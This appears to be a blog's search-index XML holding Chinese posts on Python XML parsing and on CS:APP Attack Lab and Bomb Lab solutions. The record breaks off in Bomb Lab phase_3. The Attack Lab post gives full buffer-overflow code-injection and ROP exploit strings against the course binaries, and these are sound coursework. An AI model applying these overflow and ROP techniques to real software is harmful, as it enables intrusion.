<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Python数据清洗初步</title>
      <link href="/2018/12/09/Python%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%88%9D%E6%AD%A5/"/>
      <url>/2018/12/09/Python%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%88%9D%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><a id="more"></a><p>XML是一种可扩展标记语言，被用来传输和存储数据。它是一种有逻辑的树结构。</p><h4 id="Python使用xml-ElementTree解析"><a href="#Python使用xml-ElementTree解析" class="headerlink" title="Python使用xml.ElementTree解析"></a>Python使用xml.ElementTree解析</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> xml.etree.ElementTree <span class="hljs-keyword">as</span> ET<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> json<br></code></pre></td></tr></table></figure><p>codecs用于打开文件，json用于保存清洗完的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tree = ET.parse()<span class="hljs-comment">#获取目录树</span><br>root = tree.getroot() <span class="hljs-comment">#得到树根 </span><br>root = ET.fromstring()<span class="hljs-comment">#从字符串直接解析出树根</span><br></code></pre></td></tr></table></figure><p>获取树根，然后进行操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">root.tag<span class="hljs-comment">#root元素的标记名</span><br>root.attrib<span class="hljs-comment">#root元素的属性，为一个dic</span><br><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> root:<span class="hljs-comment">#便利子元素</span><br>print(child.tag, child.attrib)<br>root[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>].text <span class="hljs-comment">#将元素视为多维数组,用下标访问</span><br>root.find(<span class="hljs-string">"element"</span>).text <span class="hljs-comment">#找出root下element下的内容字符串</span><br>title = root.get(<span class="hljs-string">"Title"</span>) <span class="hljs-comment">#获取root元素的title属性</span><br><br><span class="hljs-keyword">for</span> neighbor <span class="hljs-keyword">in</span> root.iter(<span class="hljs-string">'neighbor'</span>):<span class="hljs-comment">#遍历所有特定元素,递归到所有，子、孙...元素</span><br>print(neighbor.attrib)<br><span class="hljs-keyword">for</span> country <span class="hljs-keyword">in</span> root.findall(<span class="hljs-string">'country'</span>):<span class="hljs-comment">#找出所有country元素，仅子代</span><br>     rank = country.find(<span class="hljs-string">'rank'</span>).text<br>     name = country.get(<span class="hljs-string">'name'</span>)<br>     print(name, rank)<br><span class="hljs-keyword">for</span> country <span class="hljs-keyword">in</span> root.find(<span class="hljs-string">'country'</span>):<span class="hljs-comment">#仅找出第一个符合的子代</span><br></code></pre></td></tr></table></figure><h3 id="其他涉及知识"><a href="#其他涉及知识" class="headerlink" title="其他涉及知识"></a>其他涉及知识</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mkdir</span><span class="hljs-params">(path)</span>:</span><span class="hljs-comment">#创建文件夹</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>        os.mkdir(path)<br>        <br><span class="hljs-keyword">for</span> son_path <span class="hljs-keyword">in</span> os.listdir(root_path):<span class="hljs-comment">#遍历root_path下的文件</span><br>    <br>json.dump(dic, file_obj, ensure_ascii=<span class="hljs-keyword">False</span>, indent=<span class="hljs-number">4</span>, separators=(<span class="hljs-string">','</span>, <span class="hljs-string">': '</span>))<span class="hljs-comment">#将字典dic输出到文件file_obj中,不对ascii进行编码,缩进4,分隔符为','以及': '</span><br></code></pre></td></tr></table></figure><h3 id="暂时到此"><a href="#暂时到此" class="headerlink" title="暂时到此"></a>暂时到此</h3>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据清洗 </tag>
            
            <tag> ElementTree </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Attack_lab</title>
      <link href="/2018/12/08/Attack-lab/"/>
      <url>/2018/12/08/Attack-lab/</url>
      
        <content type="html"><![CDATA[<h3 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h3><a id="more"></a><p>本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在getbuf函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。</p><h4 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h4><p>第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。</p><p>那么我们将需要执行的操作码和地址输入机器码即可。</p><h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>第一关非常简单，题目主要我们在getbuf执行完成后执行touch1,touch1()无参。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) disas getbuf <br>Dump of assembler code for function getbuf:<br>   0x0000000000401688 &lt;+0&gt;:sub    $0x18,%rsp<br>   0x000000000040168c &lt;+4&gt;:mov    %rsp,%rdi<br>   0x000000000040168f &lt;+7&gt;:callq  0x4018ca &lt;Gets&gt;<br>   0x0000000000401694 &lt;+12&gt;:mov    $0x1,%eax<br>   0x0000000000401699 &lt;+17&gt;:add    $0x18,%rsp<br>   0x000000000040169d &lt;+21&gt;:retq   <br>End of assembler dump.<br>(gdb) disas touch1<br>Dump of assembler code for function touch1:<br>   0x00000000004016a0 &lt;+0&gt;:sub    $0x8,%rsp<br>   0x00000000004016a4 &lt;+4&gt;:movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;<br>   0x00000000004016ae &lt;+14&gt;:mov    $0x402e4e,%edi<br>   0x00000000004016b3 &lt;+19&gt;:callq  0x400bd0 &lt;puts@plt&gt;<br>   0x00000000004016b8 &lt;+24&gt;:mov    $0x1,%edi<br>   0x00000000004016bd &lt;+29&gt;:callq  0x401ab5 &lt;validate&gt;<br>   0x00000000004016c2 &lt;+34&gt;:mov    $0x0,%edi<br>   0x00000000004016c7 &lt;+39&gt;:callq  0x400d60 &lt;exit@plt&gt;<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>可以看到，getbuf开出了0x18，即24字节的空间，touch1的地址为0x4016a0。那么我们只需填满这0x28空间，再以touch1地址替代返回值。注意：x86-64机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>a0 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><p>转换后输入即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Cookie: 0x63149380<br>Type string:Touch1!: You called touch1()<br>Valid solution <span class="hljs-keyword">for</span> level 1 with target ctarget<br>PASS: Would have posted the following:<br>user id2017211523<br>coursef18<br>labattacklab<br>result117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00<br></code></pre></td></tr></table></figure><h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>第二关根据题意，需要调用touch2，需要传递一个无符号整数值，其值为cookie，查看cookie文件，如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ cat cookie.txt <br>0x63149380<br></code></pre></td></tr></table></figure><p>为了给touch2传参，我们需要将cookie值赋给%rdi，然后将touch2地址压栈，使用ret弹出touch2地址返回，调用touch2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     $0x63149380,%rdi<br>pushq   $0x4016cc<br>ret<br></code></pre></td></tr></table></figure><p>将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">phase2.o:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi<br>   7:   68 cc 16 40 00          pushq  $0x4016cc<br>   c:   c3                      retq<br></code></pre></td></tr></table></figure><p>我们将指令的机器码放在getbuf时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用getbuf时栈顶地址为0x5566f7a8。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 c7 c7 80 93 14 63 68<br>cc 16 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>a8 f7 66 55 00 00 00 00<br></code></pre></td></tr></table></figure><p>输入运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -q<br>Cookie: 0x63149380<br>Type string:Touch2!: You called touch2(0x63149380)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target ctarget<br>PASS: Would have posted the following:<br>user id2017211523<br>coursef18<br>labattacklab<br>result117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00<br></code></pre></td></tr></table></figure><h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>查看touch3</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">touch3</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *sval)</span><br></span>&#123;<br>vlevel = <span class="hljs-number">3</span>; <span class="hljs-comment">/* Part of validation protocol */</span><br><span class="hljs-keyword">if</span> (hexmatch(cookie, sval)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);<br>validate(<span class="hljs-number">3</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);<br>fail(<span class="hljs-number">3</span>);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可知其需要一个指向字符的指针sval，然后调用hexmatch，将cookie和sval作为参数传入，需要hexomatch返回非零值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hexmatch</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> val, <span class="hljs-keyword">char</span> *sval)</span><br></span>&#123;<br>    <span class="hljs-keyword">char</span> cbuf[<span class="hljs-number">110</span>];<br>    <span class="hljs-comment">/* Make position of check string unpredictable */</span><br>    <span class="hljs-keyword">char</span> *s = cbuf + random() % <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">sprintf</span>(s, <span class="hljs-string">"%.8x"</span>, val);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">strncmp</span>(sval, s, <span class="hljs-number">9</span>) == <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由hexmatch可知，其比较cookie的字符串表示与传入的字符串是否相等，相等则返回1，那么问题明了，我们需要将表示cookie的字符串地址传给touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用hexmatch时候未被重写改变的空间，借以保存字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     $0x5566f7c8,%rdi<br>pushq   $0x4017a0<br>ret<br></code></pre></td></tr></table></figure><p>这里我们将cookie的字符串表示放在0x5566f7c8，编译再反汇编得到机器码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">phase3.o:     file format elf64-x86-64<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;.text&gt;:<br>   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi<br>   7:   68 a0 17 40 00          pushq  $0x4017a0<br>   c:   c3                      retq<br></code></pre></td></tr></table></figure><p>查表得出cookie字符串的16进制表示为36 33 31 34 39 33 38  30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\0’，得到攻击字符串如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 c7 c7 c8 f7 66 55 68<br>a0 17 40 00 c3 00 00 00<br>00 00 00 00 00 00 00 00<br>a8 f7 66 55 00 00 00 00<br>36 33 31 34 39 33 38 30<br>00<br></code></pre></td></tr></table></figure><p>转换输入运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -q<br>Cookie: 0x63149380<br>Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target ctarget<br>PASS: Would have posted the following:<br>user id2017211523<br>coursef18<br>labattacklab<br>result117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00<br></code></pre></td></tr></table></figure><h4 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h4><p>在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：  </p><p>1.函数栈随机化 ，无法再获取绝对地址。  </p><p>2.栈内存的内容被锁定为不可执行。  </p><p>故此，我们需要使用ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用ret指令返回完成所需操作。</p><h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><p>此关需用ROP方法完成phase_2内容。那么就需要在操作中得到cookie值，那么只有用pop指令了，需要指令为。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">popq %rax<br>movq%rax,%rdi<br>ret<br></code></pre></td></tr></table></figure><p>查找官方的write up，得知对应机器码，然后在在rtarget文件的反汇编文件中利用vim查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>3c 18 40 00 00 00 00 00/*popq rax*/<br>80 93 14 63 00 00 00 00/*cookie*/<br>49 18 40 00 00 00 00 00/*movq %rax,%rdi */<br>cc 16 40 00 00 00 00 00 /*touch2*/<br></code></pre></td></tr></table></figure><p>转换输入运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget <br>Cookie: 0x63149380<br>Type string:Touch2!: You called touch2(0x63149380)<br>Valid solution <span class="hljs-keyword">for</span> level 2 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure><h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><p>此关为phase_3的ROP版本，我们需要查找start_farm到end_farm中的gadgets，拼凑出代码实现phase_3中插入代码的功能。还需注意：  </p><p>1.0x90代表nop，除了将pc加1之外不做任何事。  </p><p>2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 </p><p>需要的指令有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq%rsp,%rax<br>movq%rax,%rdi<br>popq%rax<br>movl%eax,%ecx<br>movl%ecx,%edx<br>movl%edx,%esi<br>lea(%rdi, %rsi, 1),%rax<br>movq%rax,%rdi<br></code></pre></td></tr></table></figure><p>则攻击字符串为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00<br>bd 18 40 00 00 00 00 00/*gadget1*/<br>49 18 40 00 00 00 00 00/*gadget2*/<br>30 18 40 00 00 00 00 00/* gadget3*/<br>48 00 00 00 00 00 00 00/*cookie字符串偏移量*/<br>13 19 40 00 00 00 00 00/*gadget4*/<br>ca 18 40 00 00 00 00 00/*gadget5*/<br>b7 18 40 00 00 00 00 00/*gadget6*/<br>69 18 40 00 00 00 00 00/*gadget7*/<br>49 18 40 00 00 00 00 00/*gadget8*/<br>a0 17 40 00 00 00 00 00 /*touch3地址      */<br>36 33 31 34 39 33 38 30 /* cookie字符串  */<br>00<br></code></pre></td></tr></table></figure><p>转换文件运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget <br>Cookie: 0x63149380<br>Type string:Touch3!: You called touch3(<span class="hljs-string">"63149380"</span>)<br>Valid solution <span class="hljs-keyword">for</span> level 3 with target rtarget<br>PASS: Sent exploit string to server to be validated.<br>NICE JOB!<br></code></pre></td></tr></table></figure><h3 id="到此为止"><a href="#到此为止" class="headerlink" title="到此为止"></a>到此为止</h3>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 代码注入攻击 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bomb_lab2</title>
      <link href="/2018/12/01/Bomb_lab2/"/>
      <url>/2018/12/01/Bomb_lab2/</url>
      
        <content type="html"><![CDATA[<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><a id="more"></a><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>使用tar -vxf将炸弹压缩包解压,cd进入,可以从bomb.c中看出实验的用意以及程序的大致<br>逻辑,bomb为可执行程序,使用gdb调试该程序.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) b read_line <br>Breakpoint 1 at 0x40155c<br>(gdb) b explode_bomb <br>Breakpoint 2 at 0x4014e4<br></code></pre></td></tr></table></figure></p><p>给read_line函数打上断点,以便每次输入运行一关.给explode_bomb打上断点,以便在炸弹爆炸<br>前可以处理.</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>获得phase_1汇编代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas phase_1<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_1:<br>   0x0000000000400e80 &lt;+0&gt;:sub    <span class="hljs-variable">$0x8</span>,%rsp<br>   0x0000000000400e84 &lt;+4&gt;:mov    <span class="hljs-variable">$0x4024a0</span>,%esi<br>   0x0000000000400e89 &lt;+9&gt;:callq  0x40127e &lt;strings_not_equal&gt;<br>   0x0000000000400e8e &lt;+14&gt;:<span class="hljs-built_in">test</span>   %eax,%eax<br>   0x0000000000400e90 &lt;+16&gt;:je     0x400e97 &lt;phase_1+23&gt;<br>   0x0000000000400e92 &lt;+18&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000400e97 &lt;+23&gt;:add    <span class="hljs-variable">$0x8</span>,%rsp<br>   0x0000000000400e9b &lt;+27&gt;:retq   <br>End of assembler dump.<br></code></pre></td></tr></table></figure></p><p>可见,此题是将我们输入的字符串与地址0x4024a0处字符串比较,不等则爆炸.查看该字符串.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) x/s 0x4024a0<br>0x4024a0 &lt;__dso_handle+344&gt;: <span class="hljs-string">"We have to stand with our North Korean allies."</span><br></code></pre></td></tr></table></figure></p><p>那么答案是We have to stand with our North Korean allies.</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) disas phase_2<br>Dump of assembler code <span class="hljs-keyword">for</span> <span class="hljs-keyword">function</span> phase_2:<br>   0x0000000000400e9c &lt;+0&gt;:push   %rbp<br>   0x0000000000400e9d &lt;+1&gt;:push   %rbx<br>   0x0000000000400e9e &lt;+2&gt;:sub    <span class="hljs-variable">$0x28</span>,%rsp<br>   0x0000000000400ea2 &lt;+6&gt;:mov    %rsp,%rsi<br>   0x0000000000400ea5 &lt;+9&gt;:callq  0x40151a &lt;read_six_numbers&gt;<br>   0x0000000000400eaa &lt;+14&gt;:cmpl   <span class="hljs-variable">$0x1</span>,(%rsp)<br>   0x0000000000400eae &lt;+18&gt;:je     0x400ed0 &lt;phase_2+52&gt;<br>   0x0000000000400eb0 &lt;+20&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000400eb5 &lt;+25&gt;:jmp    0x400ed0 &lt;phase_2+52&gt;<br>   0x0000000000400eb7 &lt;+27&gt;:mov    -0x4(%rbx),%eax<br>   0x0000000000400eba &lt;+30&gt;:add    %eax,%eax<br>   0x0000000000400ebc &lt;+32&gt;:cmp    %eax,(%rbx)<br>   0x0000000000400ebe &lt;+34&gt;:je     0x400ec5 &lt;phase_2+41&gt;<br>   0x0000000000400ec0 &lt;+36&gt;:callq  0x4014e4 &lt;explode_bomb&gt;<br>   0x0000000000400ec5 &lt;+41&gt;:add    <span class="hljs-variable">$0x4</span>,%rbx<br>   0x0000000000400ec9 &lt;+45&gt;:cmp    %rbp,%rbx<br>   0x0000000000400ecc &lt;+48&gt;:jne    0x400eb7 &lt;phase_2+27&gt;<br>   0x0000000000400ece &lt;+50&gt;:jmp    0x400edc &lt;phase_2+64&gt;<br>   0x0000000000400ed0 &lt;+52&gt;:lea    0x4(%rsp),%rbx<br>   0x0000000000400ed5 &lt;+57&gt;:lea    0x18(%rsp),%rbp<br>   0x0000000000400eda &lt;+62&gt;:jmp    0x400eb7 &lt;phase_2+27&gt;<br>   0x0000000000400edc &lt;+64&gt;:add    <span class="hljs-variable">$0x28</span>,%rsp<br>---Type &lt;<span class="hljs-built_in">return</span>&gt; to <span class="hljs-built_in">continue</span>, or q &lt;<span class="hljs-built_in">return</span>&gt; to quit---<br>   0x0000000000400ee0 &lt;+68&gt;:pop    %rbx<br>   0x0000000000400ee1 &lt;+69&gt;:pop    %rbp<br>   0x0000000000400ee2 &lt;+70&gt;:retq   <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>+3处发现在栈中开辟了0x28的内存区域.然后将%rsp的值传给%rsi作为<br>参数传给函数read_six_numbers,可以看出应该使用开辟的空闲内存做<br>数组,记数组为r,读取六个数字.将(%rsp)和0x1比较,如果不等,就会爆<br>炸,(％rsp)为数组首元,故r[0]＝１;跳转到+52,将r[1]地址赋给%rbx,<br>将r<a href="实际不存在">6</a>地址赋给%rbp,跳到+27,将%eax设为%rbx指向的前一个<br>数,此时为r[0],比较r[1]和2*r[0]是否相等,不等则爆炸.跳转到+41,％<br>rbx+4,比较%rbx和%rbp,不等跳转到+27,重复,等则跳转到+64结束,成功<br>.可以看出，这是一个循环比较.等价于下面的c语a言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> *b = &amp;r[<span class="hljs-number">1</span>]; b != &amp;r[<span class="hljs-number">6</span>]; b++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(*b != <span class="hljs-number">2</span> * (*(b - <span class="hljs-number">1</span>)))<br>        call explode_bomb;<br></code></pre></td></tr></table></figure><p>故答案应该为1 2 4 8 16 32.</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><figure class="highlight 